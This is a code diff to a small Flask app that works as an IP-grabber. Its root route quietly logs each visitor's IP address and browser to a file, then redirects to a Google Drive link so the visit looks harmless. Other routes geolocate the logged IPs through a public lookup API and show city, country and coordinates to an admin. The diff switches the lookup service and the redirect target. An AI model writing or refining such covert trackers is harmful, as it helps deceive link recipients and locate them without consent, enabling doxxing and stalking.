@@ -18,8 +18,8 @@ HTML_TEMPLATE = """
 
 @app.route("/")
 def index():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip = ip.split(",")[0].strip()
+    ip_list = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = ip_list.split(",")[0].strip()
 
     ua = request.headers.get("User-Agent")
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -27,7 +27,7 @@ def index():
     with open("log.txt", "a") as f:
         f.write(f"{time} | IP: {ip} | UA: {ua}\n")
 
-    return redirect("https://drive.google.com/file/d/18ToI0h-n8fPCo18nL6jkrJDk_kw2w0Vl/view?usp=sharing")
+    return redirect("https://drive.google.com/drive/u/0/my-drive")
 
 @app.route("/admin", methods=["GET", "POST"])
 def admin():
@@ -49,9 +49,9 @@ def admin():
 @app.route("/map/<ip>")
 def show_map(ip):
     try:
-        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
-        lat, lon = response.get("latitude"), response.get("longitude")
-        city, country = response.get("city"), response.get("country_name")
+        response = requests.get(f"http://ip-api.com/json/{ip}").json()
+        lat, lon = response.get("lat"), response.get("lon")
+        city, country = response.get("city"), response.get("country")
 
         if lat and lon:
             return f"""
